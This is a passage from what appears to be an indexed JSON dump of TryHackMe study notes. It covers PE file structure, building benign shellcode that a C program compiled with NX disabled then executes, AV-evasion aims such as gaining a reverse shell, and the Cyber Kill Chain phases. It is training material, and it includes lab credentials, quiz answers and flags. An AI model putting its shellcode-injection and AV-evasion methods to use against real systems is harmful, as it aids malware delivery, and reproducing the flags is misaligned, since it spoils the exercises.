program by disabling the NX protection, which may prevent us from executing the code correctly in the data segment or stack. Understanding shellcodes and how they are created is essential for the following tasks, especially when dealing with encrypting and encoding the shellcode. Answer the questions bellow Modify your C program to execute the following shellcode. What is the flag? unsigned char message [] = { 0xeb , 0x34 , 0xb9 , 0x00 , 0x00 , 0x00 , 0x00 , 0x5e , 0x48 , 0x89 , 0xf0 , 0x80 , 0x34 , 0x08 , 0x01 , 0x48 , 0x83 , 0xc1 , 0x01 , 0x48 , 0x83 , 0xf9 , 0x19 , 0x75 , 0xf2 , 0xb8 , 0x01 , 0x00 , 0x00 , 0x00 , 0xbf , 0x01 , 0x00 , 0x00 , 0x00 , 0xba , 0x19 , 0x00 , 0x00 , 0x00 , 0x0f , 0x05 , 0xb8 , 0x3c , 0x00 , 0x00 , 0x00 , 0xbf , 0x00 , 0x00 , 0x00 , 0x00 , 0x0f , 0x05 , 0xe8 , 0xc7 , 0xff , 0xff , 0xff , 0x55 , 0x49 , 0x4c , 0x7a , 0x78 , 0x31 , 0x74 , 0x73 , 0x2c , 0x30 , 0x72 , 0x36 , 0x2c , 0x34 , 0x69 , 0x32 , 0x30 , 0x30 , 0x62 , 0x31 , 0x65 , 0x32 , 0x7c , 0x0d , 0x0a }; Ans: name","title":"AV Evasion - Shellcode"},{"location":"tryhackme/room/l/avevasionshellcode/#av-evasion-shellcode","text":"Room at https://tryhackme.com/room/avevasionshellcode","title":"AV Evasion - Shellcode"},{"location":"tryhackme/room/l/avevasionshellcode/#task-1-introduction","text":"In this room, we'll explore how to build and deliver payloads, focusing on avoiding detection by common AV engines. We'll look at different techniques available to us as attackers and discuss the pros and cons of every one of them.","title":"Task 1: Introduction"},{"location":"tryhackme/room/l/avevasionshellcode/#objectives","text":"Learn how shellcodes are made. Explore the pros and cons of staged payloads. Create stealthy shellcodes to avoid AV detection.","title":"Objectives"},{"location":"tryhackme/room/l/avevasionshellcode/#prerequisites","text":"It is recommended to have some prior knowledge of how antivirus software works and a basic understanding of encryption and encoding. While not strictly required, some knowledge of basic assembly language can also be helpful. Also, we recommend having a basic understanding of reading code and understanding functions (C, C#).","title":"Prerequisites"},{"location":"tryhackme/room/l/avevasionshellcode/#task-2-challenge","text":"In this challenge, we prepared a Windows machine with a web application to let you upload your payloads. Once uploaded, the payloads will be checked by an AV and executed if found to be clean of malware. The main goal of this challenge is to evade Antivirus software installed on the VM and capture the flag in the file system. Feel free to try all of the techniques discussed throughout the room by uploading them to http://MACHINE_IP/ . Points to remember: Try to combine the techniques discussed in this room. The website supports EXE files only. Once the AV scans the uploaded file and no malicious code is detected, the file gets executed. Thus, if everything is put together correctly, then you should receive a reverse shell. You can ignore the questions for this task for now, but be sure to come back to them once you have successfully bypassed the AV and gained a shell. Deploy the attached VM to follow up with the content of the room before continuing to the next section! The VM will deploy in-browser and should appear automatically in the Split View. In case the VM is not visible, use the blue Show Split View button at the top-right of the page. If you prefer connecting via RDP, you can do so with the following credentials: Username: thm Password: Password321 You will also need the AttackBox for some tasks, so this is also a good moment to start it. Answer the questions bellow Question: Which Antivirus software is running on the VM? Ans: name Question: What is the name of the user account to which you have access? Ans: Question: Establish a working shell on the victim machine and read the file on the user's desktop. What is the flag? Ans:","title":"Task 2: Challenge"},{"location":"tryhackme/room/l/avevasionshellcode/#task-3-pe-structure","text":"This task highlights some of the high-level essential elements of PE data structure for Windows binaries.","title":"Task 3: PE Structure"},{"location":"tryhackme/room/l/avevasionshellcode/#what-is-pe","text":"Windows Executable file format, aka PE (Portable Executable), is a data structure that holds information necessary for files. It is a way to organize executable file code on a disk. Windows operating system components, such as Windows and DOS loaders, can load it into memory and execute it based on the parsed file information found in the PE. In general, the default file structure of Windows binaries, such as EXE, DLL, and Object code files, has the same PE structure and works in the Windows operating system for both (x86 and x64) CPU architecture. A PE structure contains various sections that hold information about the binary, such as metadata and links to a memory address of external libraries. One of these sections is the PE Header , which contains metadata information, pointers, and links to address sections in memory. Another section is the Data section , which includes containers that include the information required for the Windows loader to run a program, such as the executable code, resources, links to libraries, data variables, etc. There are different types of data containers in the PE structure, each holding different data. .text stores the actual code of the program .data holds the initialized and defined variables .bss holds the uninitialized data (declared variables with no assigned values) .rdata contains the read-only data .edata : contains exportable objects and related table information .idata imported objects and related table information .reloc image relocation information .rsrc links external resources used by the program such as images, icons, embedded binaries, and manifest file, which has all information about program versions, authors, company, and copyright! The PE structure is a vast and complicated topic, and we are not going to go into too much detail regarding the headers and data sections. This task provides a high-level overview of the PE structure. If you are interested in gaining more information on the topic, we suggest checking the following THM rooms where the topic is explained in greater detail: Windows Internals Dissecting PE Headers You can also get more in-depth details about PE if you check the Windows PE format's Docs website. When looking at the PE contents, we'll see it contains a bunch of bytes that aren't human-readable. However, it includes all the details the loader needs to run the file. The following are the example steps in which the Windows loader reads an executable binary and runs it as a process. Header sections: DOS, Windows, and optional headers are parsed to provide information about the EXE file. For example, The magic number starts with \"MZ,\" which tells the loader that this is an EXE file. File Signatures Whether the file is compiled for x86 or x64 CPU architecture. Creation timestamp. Parsing the section table details, such as Number of Sections the file contains. Mapping the file contents into memory based on The EntryPoint address and the offset of the ImageBase. RVA: Relative Virtual Address, Addresses related to Imagebase. Imports, DLLs, and other objects are loaded into the memory. The EntryPoint address is located and the main execution function runs.","title":"What is PE?"},{"location":"tryhackme/room/l/avevasionshellcode/#why-do-we-need-to-know-about-pe","text":"There are a couple of reasons why we need to learn about it. First, since we are dealing with packing and unpacking topics, the technique requires details about the PE structure. The other reason is that AV software and malware analysts analyze EXE files based on the information in the PE Header and other PE sections. Thus, to create or modify malware with AV evasion capability targeting a Windows machine, we need to understand the structure of Windows Portable Executable files and where the malicious shellcode can be stored. We can control in which Data section to store our shellcode by how we define and initialize the shellcode variable. The following are some examples that show how we can store the shellcode in PE: Defining the shellcode as a local variable within the main function will store it in the .TEXT PE section. Defining the shellcode as a global variable will store it in the .Data section. Another technique involves storing the shellcode as a raw binary in an icon image and linking it within the code, so in this case, it shows up in the .rsrc Data section. We can add a custom data section to store the shellcode.","title":"Why do we need to know about PE?"},{"location":"tryhackme/room/l/avevasionshellcode/#pe-bear","text":"The attached VM is a Windows development machine that has the tools needed to parse EXE files and read the details we discussed. For your convenience, we have provided a copy of the PE-Bear software on the Desktop, which helps to check the PE structure: Headers, Sections, etc. PE-Bear provides a graphic user interface to show all relevant EXE details. To load an EXE file for analysis, select File -> Load PEs (Ctrl + O). Once a file is loaded, we can see all PE details. The following screenshot shows PE details of the loaded file, including the headers and sections we discussed earlier in this task. Now it is time to try it out! Load the thm-intro2PE.exe file to answer the questions below. The file is located in the following location: c:\\Tools\\PE files\\thm-intro2PE.exe Answer the questions bellow Question: What is the last 6 digits of the MD5 hash value of the thm-intro2PE.exe file? Ans: 530949 Question: What is the Magic number value of the thm-intro2PE.exe file (in Hex)? Ans: 5A4D Question: What is the Entry Point value of the thm-intro2PE.exe file? Ans: 12E4 Question: How many Sections does the thm-intro2PE.exe file have? Ans: 7 Question: A custom section could be used to store extra data. Malware developers use this technique to create a new section that contains their malicious code and hijack the flow of the program to jump and execute the content of the new section. What is the name of the extra section? Ans: .flag Question: Check the content of the extra section. What is the flag? Ans: THM{PE-N3w-s3ction!}","title":"PE-Bear"},{"location":"tryhackme/room/l/avevasionshellcode/#task-4-introduction-to-shellcode","text":"Shellcode is a set of crafted machine code instructions that tell the vulnerable program to run additional functions and, in most cases, provide access to a system shell or create a reverse command shell. Once the shellcode is injected into a process and executed by the vulnerable software or program, it modifies the code run flow to update registers and functions of the program to execute the attacker's code. It is generally written in Assembly language and translated into hexadecimal opcodes (operational codes). Writing unique and custom shellcode helps in evading AV software significantly. But writing a custom shellcode requires excellent knowledge and skill in dealing with Assembly language, which is not an easy task!","title":"Task 4: Introduction to Shellcode"},{"location":"tryhackme/room/l/avevasionshellcode/#a-simple-shellcode","text":"In order to craft your own shellcode, a set of skills is required: A decent understanding of x86 and x64 CPU architectures. Assembly language. Strong knowledge of programming languages such as C. Familiarity with the Linux and Windows operating systems. To generate our own shellcode, we need to write and extract bytes from the assembler machine code. For this task, we will be using the AttackBox to create a simple shellcode for Linux that writes the string \"THM, Rocks!\". The following assembly code uses two main functions: System Write function (sys_write) to print out a string we choose. System Exit function (sys_exit) to terminate the execution of the program. To call those functions, we will use syscalls . A syscall is the way in which a program requests the kernel to do something. In this case, we will request the kernel to write a string to our screen, and the exit the program. Each operating system has a different calling convention regarding syscalls, meaning that to use the write in Linux, you'll probably use a different syscall than the one you'd use on Windows. For 64-bits Linux, you can call the needed functions from the kernel by setting up the following values: rax System Call rdi rsi rdx 0x1 sys_write unsigned int fd const char *buf size_t count 0x3c sys_exit int error_code The table above tells us what values we need to set in different processor registers to call the sys_write and sys_exit functions using syscalls. For 64-bits Linux, the rax register is used to indicate the function in the kernel we wish to call. Setting rax to 0x1 makes the kernel execute sys_write, and setting rax to 0x3c will make the kernel execute sys_exit. Each of the two functions require some parameters to work, which can be set through the rdi, rsi and rdx registers. You can find a complete reference of available 64-bits Linux syscalls here . For sys_write , the first parameter sent through rdi is the file descriptor to write to. The second parameter in rsi is a pointer to the string we want to print, and the third in rdx is the size of the string to print. For sys_exit , rdi needs to be set to the exit code for the program. We will use the code 0, which means the program exited successfully. Copy the following code to your AttackBox in a file called thm.asm : global _start section .text _start: jmp MESSAGE ; 1) let's jump to MESSAGE GOBACK: mov rax , 0x1 mov rdi , 0x1 pop rsi ; 3) we are popping into `rsi`; now we have the ; address of \"THM, Rocks!\\r\\n\" mov rdx , 0xd syscall mov rax , 0x3c mov rdi , 0x0 syscall MESSAGE: call GOBACK ; 2) we are going back, since we used `call`, that means ; the return address, which is, in this case, the address ; of \"THM, Rocks!\\r\\n\", is pushed into the stack. db \" THM , Rocks ! \" , 0 dh , 0 ah Let's explain the ASM code a bit more. First, our message string is stored at the end of the .text section. Since we need a pointer to that message to print it, we will jump to the call instruction before the message itself. When call GOBACK is executed, the address of the next instruction after call will be pushed into the stack, which corresponds to where our message is. Note that the 0dh, 0ah at the end of the message is the binary equivalent to a new line (\\r\\n). Next, the program starts the GOBACK routine and prepares the required registers for our first sys_write() function. We specify the sys_write function by storing 1 in the rax register. We set rdi to 1 to print out the string to the user's console (STDOUT). We pop a pointer to our string, which was pushed when we called GOBACK and store it into rsi. With the syscall instruction, we execute the sys_write function with the values we prepared. For the next part, we do the same to call the sys_exit function, so we set 0x3c into the rax register and call the syscall function to exit the program. Next, we compile and link the ASM code to create an x64 Linux executable file and finally execute the program. Assembler and link our code user @AttackBox $ nasm -f elf64 thm . asm user @AttackBox $ ld thm . o -o thm user @AttackBox $ ./ thm THM , Rocks ! We used the nasm command to compile the asm file, specifying the -f elf64 option to indicate we are compiling for 64-bits Linux. Notice that as a result we obtain a .o file, which contains object code, which needs to be linked in order to be a working executable file. The ld command is used to link the object and obtain the final executable. The -o option is used to specify the name of the output executable file. Now that we have the compiled ASM program, let's extract the shellcode with the objdump command by dumping the .text section of the compiled binary. Dump the .text section user @AttackBox $ objdump -d thm thm : file format elf64-x86 - 64 Disassembly of section . text : 0000000000400080 < _start >: 400080 : eb 1e jmp 4000a0 0000000000400082 : 400082 : b8 01 00 00 00 mov $0x1 , % eax 400087 : bf 01 00 00 00 mov $0x1 , % edi 40008c : 5e pop % rsi 40008d : ba 0d 00 00 00 mov $0xd , % edx 400092 : 0f 05 syscall 400094 : b8 3c 00 00 00 mov $0x3c , % eax 400099 : bf 00 00 00 00 mov $0x0 , % edi 40009e : 0f 05 syscall 00000000004000a0 : 4000a0 : e8 dd ff ff ff callq 400082 4000a5 : 54 push % rsp 4000a6 : 48 rex . W 4000a7 : 4d 2c 20 rex . WRB sub $0x20 , % al 4000aa : 52 push % rdx 4000ab : 6f outsl % ds :( % rsi ),( % dx ) 4000ac : 63 6b 73 movslq 0x73 ( % rbx ), % ebp 4000af : 21 . byte 0x21 4000b0 : 0d . byte 0xd 4000b1 : 0a . byte 0xa Now we need to extract the hex value from the above output. To do that, we can use objcopy to dump the .text section into a new file called thm.text in a binary format as follows: Extract the .text section user @AttackBox $ objcopy -j . text -O binary thm thm . text The thm.text contains our shellcode in binary format, so to be able to use it, we will need to convert it to hex first. The xxd command has the -i option that will output the binary file in a C string directly: Output the hex equivalent to our shellcode user @AttackBox $ xxd -i thm . text unsigned char new_text [] = { 0xeb , 0x1e , 0xb8 , 0x01 , 0x00 , 0x00 , 0x00 , 0xbf , 0x01 , 0x00 , 0x00 , 0x00 , 0x5e , 0xba , 0x0d , 0x00 , 0x00 , 0x00 , 0x0f , 0x05 , 0xb8 , 0x3c , 0x00 , 0x00 , 0x00 , 0xbf , 0x00 , 0x00 , 0x00 , 0x00 , 0x0f , 0x05 , 0xe8 , 0xdd , 0xff , 0xff , 0xff , 0x54 , 0x48 , 0x4d , 0x2c , 0x20 , 0x52 , 0x6f , 0x63 , 0x6b , 0x73 , 0x21 , 0x0d , 0x0a }; unsigned int new_text_len = 50 ; Finally, we have it, a formatted shellcode from our ASM assembly. That was fun! As we see, dedication and skills are required to generate shellcode for your work! To confirm that the extracted shellcode works as we expected, we can execute our shellcode and inject it into a C program. #include <stdio.h> int main ( int argc , char ** argv ) { unsigned char message [] = { 0xeb , 0x1e , 0xb8 , 0x01 , 0x00 , 0x00 , 0x00 , 0xbf , 0x01 , 0x00 , 0x00 , 0x00 , 0x5e , 0xba , 0x0d , 0x00 , 0x00 , 0x00 , 0x0f , 0x05 , 0xb8 , 0x3c , 0x00 , 0x00 , 0x00 , 0xbf , 0x00 , 0x00 , 0x00 , 0x00 , 0x0f , 0x05 , 0xe8 , 0xdd , 0xff , 0xff , 0xff , 0x54 , 0x48 , 0x4d , 0x2c , 0x20 , 0x52 , 0x6f , 0x63 , 0x6b , 0x73 , 0x21 , 0x0d , 0x0a }; ( * ( void ( * )()) message )(); return 0 ; } Then, we compile and execute it as follows, Compiler our C program user @AttackBox $ gcc -g -Wall -z execstack thm . c -o thmx user @AttackBox $ ./ thmx THM , Rocks ! Nice! it works. Note that we compile the C program by disabling the NX protection, which may prevent us from executing the code correctly in the data segment or stack. Understanding shellcodes and how they are created is essential for the following tasks, especially when dealing with encrypting and encoding the shellcode. Answer the questions bellow Modify your C program to execute the following shellcode. What is the flag? unsigned char message [] = { 0xeb , 0x34 , 0xb9 , 0x00 , 0x00 , 0x00 , 0x00 , 0x5e , 0x48 , 0x89 , 0xf0 , 0x80 , 0x34 , 0x08 , 0x01 , 0x48 , 0x83 , 0xc1 , 0x01 , 0x48 , 0x83 , 0xf9 , 0x19 , 0x75 , 0xf2 , 0xb8 , 0x01 , 0x00 , 0x00 , 0x00 , 0xbf , 0x01 , 0x00 , 0x00 , 0x00 , 0xba , 0x19 , 0x00 , 0x00 , 0x00 , 0x0f , 0x05 , 0xb8 , 0x3c , 0x00 , 0x00 , 0x00 , 0xbf , 0x00 , 0x00 , 0x00 , 0x00 , 0x0f , 0x05 , 0xe8 , 0xc7 , 0xff , 0xff , 0xff , 0x55 , 0x49 , 0x4c , 0x7a , 0x78 , 0x31 , 0x74 , 0x73 , 0x2c , 0x30 , 0x72 , 0x36 , 0x2c , 0x34 , 0x69 , 0x32 , 0x30 , 0x30 , 0x62 , 0x31 , 0x65 , 0x32 , 0x7c , 0x0d , 0x0a }; Ans: name","title":"A Simple Shellcode!"},{"location":"tryhackme/room/l/cyberkillchainzmt/","tags":["THM-Room","Cyber Kill Chain"],"text":"Cyber Kill Chain \u00b6 Task 1: Introduction \u00b6 Cyber kill chain The term kill chain is a military concept related to the structure of an attack. It consists of target identification, decision and order to attack the target, and finally the target destruction. Thanks to Lockheed Martin, a global security and aerospace company, that established the Cyber Kill Chain\u00ae framework for the cybersecurity industry in 2011 based on the military concept. The framework defines the steps used by adversaries or malicious actors in cyberspace. To succeed, an adversary needs to go through all phases of the Kill Chain. We will go through the attack phases and help you better understand adversaries and their techniques used in the attack to defend yourself. So, why is it important to understand how Cyber Kill Chain works? The Cyber Kill Chain will help you understand and protect against ransomware attacks, security breaches as well as Advanced Persistent Threats (APTs). You can use the Cyber Kill Chain to assess your network and system security by identifying missing security controls and closing certain security gaps based on your company's infrastructure. By understanding the Kill Chain as a SOC Analyst, Security Researcher, Threat Hunter, or Incident Responder, you will be able to recognize the intrusion attempts and understand the intruder's goals and objectives. We will be exploring the following attack phases in this room: Reconnaissance Weaponization Delivery Exploitation Installation Command & Control Actions on Objectives Learning Objectives : In this room, you will learn about each phase of the Cyber Kill Chain Framework, the advantages and disadvantages of the traditional Cyber Kill Chain. Outcome : As a result, you will be ready to recognize different phases or stages of the attack carried out by an adversary and be able to break the \"kill chain.\" Task 2: Reconnaissance \u00b6 Reconnaissance To learn what reconnaissance is from the attacker's perspective, first, let's define the term reconnaissance . Reconnaissance is discovering and collecting information on the system and the victim. The reconnaissance phase is the planning phase for the adversaries. OSINT (Open-Source Intelligence) also falls under reconnaissance. OSINT is the first step an attacker needs to complete to carry out the further phases of an attack. The attacker needs to study the victim by collecting every available piece of information on the company and its employees, such as the company's size, email addresses, phone numbers from publicly available resources to determine the best target for the attack. You can also find out more about OSINT from this Varonis article, \"What is OSINT ?\" Let's look at it from the attacker's perspective, who initially doesn't know what company he wants to attack. Here is the scenario: A malicious attacker who names himself \"Megatron\" decides to conduct a very sophisticated attack that he has been planning out for years; he has been studying and researching different tools and techniques that could help him get to the last phase of the Cyber Kill Chain. But first, he needs to start from the Reconnaissance phase. In order to operate in this phase, the attacker would need to conduct OSINT . Let's have a look at Email harvesting. Email harvesting is the process of obtaining email addressesfrom public, paid, or free services. An attacker can use email-address harvesting for a phishing attack (a type of social-engineering attack used to steal sensitive data, including login credentials and credit card numbers). The attacker will have a big arsenal of tools available for reconnaissance purposes. Here are some of them: theHarvester - other than gathering emails, this tool is also capable of gathering names, subdomains, IPs, and URLs using multiple public data sources Hunter.io - this is an email hunting tool that will let you obtain contact information associated with the domain OSINT Framework - OSINT Framework provides the collection of OSINT tools based on various categories An attacker would also use social media websites such as LinkedIn, Facebook, Twitter, and Instagram to collect information on a specific victim he would want to attack or the company. The information found on social media can be beneficial for an attacker to conduct a phishing attack. List of the questions solved Question: What is the name of the Intel Gathering Tool that is a web-based interface to the common tools and resources for open-source intelligence? OSINT Framework Question: What is the definition for the email gathering process during the stage of reconnaissance? Email harvesting Task 3: Weaponization \u00b6 Weaponization After a successful reconnaissance stage, \"Megatron\" would work on crafting a \"weapon of destruction\". He would prefer not to interact with the victim directly and, instead, he will create a \"weaponizer\" that, according to Lockheed Martin, combines malware and exploit into a deliverable payload . Most attackers usually use automated tools to generate the malware or refer to the DarkWeb to purchase the malware. More sophisticated actors or nation-sponsored APT (Advanced Persistent Threat Groups) would write their custom malware to make the malware sample unique and evade detection on the target. Let's first define some terminology before we analyze the Weaponization phase. Malware is a program or software that is designed to damage, disrupt, or gain unauthorized access to a computer. An exploit is a program or a code that takes advantage of the vulnerability or flaw in the application or system. A payload is a malicious code that the attacker runs on the system. Continuing with our adversary, \"Megatron\" chooses... \"Megatron\" chooses to buy an already written payload from someone else in the DarkWeb, so that he can spend more time on the other phases. In the Weaponization phase, the attacker would: Create an infected Microsoft Office document containing a malicious macro or VBA (Visual Basic for Applications) scripts. If you want to learn about macro and VBA, please refer to the article \"Intro to Macros and VBA For Script Kiddies\" by TrustedSec . An attacker can create a malicious payload or a very sophisticated worm, implant it on the USB drives, and then distribute them in public. An example of the virus. An attacker would choose Command and Control (C2) techniques for executing the commands on the victim's machine or deliver more payloads. You can read more about the C2 techniques on MITRE ATT&CK . An attacker would select a backdoor implant (the way to access the computer system, which includes bypassing the security mechanisms). List of the questions solved Question: This term is referred to as a group of commands that perform a specific task. You can think of them as subroutines or functions that contain the code that most users use to automate routine tasks. But malicious actors tend to use them for malicious purposes and include them in Microsoft Office documents. Can you provide the term for it? macro Task 4: Delivery \u00b6 Delivery The Delivery phase is when \"Megatron\" decides to choose the method for transmitting the payload or the malware. He has plenty of options to choose from: Phishing email: after conducting the reconnaissance and determining the targets for the attack, the malicious actor would craft a malicious email that would target either a specific person (spearphishing attack) or multiple people in the company. The email would contain a payload or malware. For example, \"Megatron\" would learn that Nancy from the Sales department at company A would constantly like the posts on LinkedIn from Scott, a Service Delivery Manager at company B. He would give it a second guess that they both communicate with each other over work emails. \"Megatron\" would craft an email using Scott's First Name and Last Name, making the domain look similar to the company Scott is working at. An attacker would then send a fake \"Invoice\" email to Nancy, which contains the payload. Distributing infected USB drives in public places like coffee shops, parking lots, or on the street. An attacker might decide to conduct a sophisticated USB Drop Attack by printing the company's logo on the USB drives and mailing them to the company while pretending to be a customer sending the USB devices as a gift. You can read about one of these similar attacks at CSO Online \"Cybercriminal group mails malicious USB dongles to targeted companies.\" Watering hole attack. A watering hole attack is a targeted attack designed to aim at a specific group of people by compromising the website they are usually visiting and then redirecting them to the malicious website of an attacker's choice. The attacker would look for a known vulnerability for the website and try to exploit it. The attacker would encourage the victims to visit the website by sending \"harmless\" emails pointing out the malicious URL to make the attack work more efficiently. After visiting the website, the victim would unintentionally download malware or a malicious application to their computer. This type of attack is called a drive-by download. An example can be a malicious pop-up asking to download a fake Browser extension. List of the questions solved Question: What is the name of the attack when it is performed against a specific group of people, and the attacker seeks to infect the website that the mentioned group of people is constantly visiting. Watering hole attack Task 5: Exploitation \u00b6 Exploitation To gain access to the system, an attacker needs to exploit the vulnerability. In this phase, \"Megatron\" got a little bit creative - he created two phishing emails, one that contains a phishing link to a fake Office 365 login page and another one containing a macro attachment that would execute ransomware when the victim opens it. \"Megatron\" successfully delivered his exploits and got two victims to click on the malicious link and open the malicious file. After gaining access to the system, the malicious actor could exploit software, system, or server-based vulnerabilities to escalate the privileges or move laterally through the network. According to CrowdStrike , lateral movement refers to the techniques that a malicious actor uses after gaining initial access to the victim's machine to move deeper into a network to obtain sensitive data. If you want to learn more about server-based or web-based vulnerabilities, please refer to the TryHackMe room OWASP Top 10 . The attacker might also apply a \"Zero-day Exploit\" in this stage. According to FireEye , \"the zero-day exploit or a zero-day vulnerability is an unknown exploit in the wild that exposes a vulnerability in software or hardware and can create complicated problems well before anyone realizes something is wrong. A zero-day exploit leaves NO opportunity for detection at the beginning.\" These are examples of how an attacker carries out exploitation: The victim triggers the exploit by opening the email attachment or clicking on a malicious link. Using a zero-day exploit. Exploit software, hardware, or even human vulnerabilities. An attacker triggers the exploit for server-based vulnerabilities. List of the questions solved Question: Can you provide the name for a cyberattack targeting a software vulnerability that is unknown to the antivirus or software vendors? zero-day Task 6: Installation \u00b6 Installation As you have learned from the Weaponization phase, the backdoor lets an attacker bypass security measures and hide the access. A backdoor is also known as an access point. Once the attacker gets access to the system, he would want to reaccess the system if he loses the connection to it or if he got detected and got the initial access removed, or if the system is later patched. He will no longer have access to it. That is when the attacker needs to install a persistent backdoor . A persistent backdoor will let the attacker access the system he compromised in the past. You can check out the Windows Persistence Room on TryHackMe to learn how an attacker can achieve persistence on Windows. The persistence can be achieved through: Installing a web shell on the webserver. A web shell is a malicious script written in web development programming languages such as ASP, PHP, or JSP used by an attacker to maintain access to the compromised system. Because of the web shell simplicity and file formatting (.php, .asp, .aspx, .jsp, etc.) can be difficult to detect and might be classified as benign. You may check out this great article released by Microsoft on various web shell attacks. Installing a backdoor on the victim's machine. For example, the attacker can use Meterpreter to install a backdoor on the victim's machine. Meterpreter is a Metasploit Framework payload that gives an interactive shell from which an attacker can interact with the victim's machine remotely and execute the malicious code. Creating or modifying Windows services. This technique is known as T1543.003 on MITRE ATT&CK (MITRE ATT&CK\u00ae is a knowledge base of adversary tactics and techniques based on real-world scenarios). An attacker can create or modify the Windows services to execute the malicious scripts or payloads regularly as a part of the persistence. An attacker can use the tools like sc.exe (sc.exe lets you Create, Start, Stop, Query, or Delete any Windows Service) and Reg to modify service configurations. The attacker can also masquerade the malicious payload by using a service name that is known to be related to the Operating System or legitimate software. Adding the entry to the \"run keys\" for the malicious payload in the Registry or the Startup Folder. By doing that, the payload will execute each time the user logs in on the computer. According to MITRE ATT&CK, there is a startup folder location for individual user accounts and a system-wide startup folder that will be checked no matter what user account logs in. You can read more about the Registry Run Keys / Startup Folder persistence on one of the MITRE ATT&CK techniques . In this phase, the attacker can also use the Timestomping technique to avoid detection by the forensic investigator and also to make the malware appear as a part of a legitimate program. The Timestomping technique lets an attacker modify the file's timestamps, including the modify, access, create and change times. List of the questions solved Question: Can you provide the technique used to modify file time attributes to hide new or changes to existing files? Timestomping Question: Can you name the malicious script planted by an attacker on the webserver to maintain access to the compromised system and enables the webserver to be accessed remotely? web shell Task 7: Command & Control \u00b6 Command & Control After getting persistence and executing the malware on the victim's machine, \"Megatron\" opens up the C2 (Command and Control) channel through the malware to remotely control and manipulate the victim. This term is also known as C&C or C2 Beaconing as a type of malicious communication between a C&C server and malware on the infected host. The infected host will consistently communicate with the C2 server; that is also where the beaconing term came from. The compromised endpoint would communicate with an external server set up by an attacker to establish a command & control channel. After establishing the connection, the attacker has full control of the victim's machine. Until recently, IRC (Internet Relay Chat) was the traditional C2 channel used by attackers. This is no longer the case, as modern security solutions can easily detect malicious IRC traffic. The most common C2 channels used by adversaries nowadays: The protocols HTTP on port 80 and HTTPS on port 443 - this type of beaconing blends the malicious traffic with the legitimate traffic and can help the attacker evade firewalls. DNS (Domain Name Server). The infected machine makes constant DNS requests to the DNS server that belongs to an attacker, this type of C2 communication is also known as DNS Tunneling. Important to note that an adversary or another compromised host can be the owner of the C2 infrastructure. List of the questions solved Question: What is the C2 communication where the victim makes regular DNS requests to a DNS server and domain which belong to an attacker. DNS Tunneling Task 8: Actions on Objectives (Exfiltration) \u00b6 Exfiltration After going through six phases of the attack, \"Megatron\" can finally achieve his goals, which means taking action on the original objectives. With hands-on keyboard access, the attacker can achieve the following: Collect the credentials from users. Perform privilege escalation (gaining elevated access like domain administrator access from a workstation by exploiting the misconfiguration). Internal reconnaissance (for example, an attacker gets to interact with internal software to find its vulnerabilities). Lateral movement through the company's environment. Collect and exfiltrate sensitive data. Deleting the backups and shadow copies. Shadow Copy is a Microsoft technology that can create backup copies, snapshots of computer files, or volumes. Overwrite or corrupt data. List of the questions solved Question: Can you provide a technology included in Microsoft Windows that can create backup copies or snapshots of files or volumes on the computer, even when they are in use? Shadow Copy Task 9: Practice Analysis \u00b6 We really hope you enjoyed this room. In order to strengthen your knowledge, let's do a practice analysis. Here is the real-world scenario for you to tackle: The infamous Target cyber-attack, which led to one of the largest data breaches in history took place on November 27, 2013. On December 19th, 2013, Target released a statement confirming the breach, stating that approximately 40 million credit and debit card accounts were impacted between Nov. 27 and Dec. 15, 2013. Target had to pay the fine of $18.5 million under the terms of the multistate settlement agreement. This is considered to be the largest data-breach settlement in history. How did the data breach happen? Deploy the static site attached to this task and apply your skills to build the Cyber Kill Chain of this scenario. Here are some tips to help you complete the practical: Add each item on the list in the correct Kill Chain entry-form on the Static Site Lab: exploit public-facing application data from local system powershell dynamic linker hijacking spearphishing attachment fallback channels Use the \u2018Check answers\u2019 button to verify whether the answers are correct (where wrong answers will be underlined in red). List of the questions solved Question: What is the flag after you complete the static site? THM{7HR347_1N73L_12_4w35om3} Cyber kill chain Task 10: Conclusion \u00b6 Cyber Kill Chain can be a great tool to improve network defence. Is it perfect and can it be the only tool to rely on? No. The traditional Cyber Kill Chain or Lockheed Martin Cyber Kill Chain was last modified in 2011, which, if you remember, is the date of its establishment. The absence of updates and modifications creates security gaps. The traditional Cyber Kill Chain was designed to secure the network perimeter and protect against malware threats. But the cybersecurity threats have developed drastically nowadays, and adversaries are combining multiple TTP (tactics, techniques, and procedures) to achieve their goal. Adversaries are capable of defeating threat intelligence by modifying the file hashes and IP addresses. Security solutions companies are developing technologies like AI (Artificial Intelligence) and different algorithms to detect even slight and suspicious changes. Since the main focus of the framework is on malware delivery and network security, the traditional Cyber Kill Chain will not be able to identify Insider Threats. According to CISA , \"The Insider Threat is the potential for an insider to use their authorized access or understanding of an organization to harm that organization.\" We recommend not only relying on the traditional Cyber Kill Chain model but also referring to MITRE ATT&CK as well as Unified Kill Chain to apply a more comprehensive approach to your defence methodologies.","title":"Cyber Kill Chain"},{"location":"tryhackme/room/l/cyberkillchainzmt/#cyber-kill-chain","text":"","title":"Cyber Kill Chain"},{"location":"tryhackme/room/l/cyberkillchainzmt/#task-1-introduction","text":"Cyber kill chain The term kill chain is a military concept related to the structure of an attack. It consists of target identification, decision and order to attack the target, and finally the target destruction. Thanks to Lockheed Martin, a global security and aerospace company, that established the Cyber Kill Chain\u00ae framework for the cybersecurity industry in 2011 based on the military concept. The framework defines the steps used by adversaries or malicious actors in cyberspace. To succeed, an adversary needs to go through all phases of the Kill Chain. We will go through the attack phases and help you better understand adversaries and their techniques used in the attack to defend yourself. So, why is it important to understand how Cyber Kill Chain works? The Cyber Kill Chain will help you understand and protect against ransomware attacks, security breaches as well as Advanced Persistent Threats (APTs). You can use the Cyber Kill Chain to assess your network and system security by identifying missing security controls and closing certain security gaps based on your company's infrastructure. By understanding the Kill Chain as a SOC Analyst, Security Researcher, Threat Hunter, or Incident Responder, you will be able to recognize the intrusion attempts and understand the intruder's goals and objectives. We will be exploring the following attack phases in this room: Reconnaissance Weaponization Delivery Exploitation Installation Command & Control Actions on Objectives Learning Objectives : In this room, you will learn about each phase of the Cyber Kill Chain Framework, the advantages and disadvantages of the traditional Cyber Kill Chain. Outcome : As a result, you will be ready to recognize different phases or stages of the attack carried out by an adversary and be able to break the \"kill chain.\"","title":"Task 1: Introduction"},{"location":"tryhackme/room/l/cyberkillchainzmt/#task-2-reconnaissance","text":"Reconnaissance To learn what reconnaissance is from the attacker's perspective, first, let's define the term reconnaissance . Reconnaissance is discovering and collecting information on the system and the victim. The reconnaissance phase is the planning phase for the adversaries. OSINT (Open-Source Intelligence) also falls under 